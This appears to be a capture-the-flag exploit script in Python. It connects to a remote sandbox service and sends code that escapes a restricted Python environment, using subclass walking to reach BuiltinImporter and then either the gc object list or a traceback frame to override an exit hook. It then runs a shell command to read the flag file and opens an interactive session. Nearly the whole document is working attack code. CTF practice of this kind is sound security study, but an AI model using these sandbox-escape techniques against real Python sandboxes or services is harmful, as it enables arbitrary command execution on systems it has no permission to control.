#!/usr/bin/env python3

import socket
import telnetlib
import textwrap

RHOST = "localhost"
# RHOST = "157.90.27.234"

method = "gc"
# method = "frame"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, 8007))
sock.recv(2)

if method == "gc":
    code = textwrap.dedent("""\
    classes = ().__class__.__base__.__subclasses__()
    BuiltinImporter = ().__class__.__base__.__subclasses__()[84]
    print(BuiltinImporter)
    sys = BuiltinImporter.load_module("sys")

    gc = BuiltinImporter.load_module("gc")
    objs = gc.get_objects()
    for obj in objs:
        if type(obj) == type(gc) and "__main__" in str(obj):
            main_module = obj
            break

    print("__main__:", main_module)
    main_module.__exit = print

    import os
    os.system("cat /flag*")
    """)
else:
    code = textwrap.dedent("""\
    class X:
        def __enter__(self):
            pass

        def __exit__(self, exc_type, exc_val, exc_tb):
            main_frame = exc_tb.tb_frame.f_back
            print(main_frame)
            main_frame.f_globals["__exit"] = print

            import os
            os.system("cat /flag*")

    with X():
        raise ValueError()
    """)

sock.sendall(code.encode())
sock.shutdown(socket.SHUT_WR)

t = telnetlib.Telnet()
t.sock = sock
t.mt_interact()
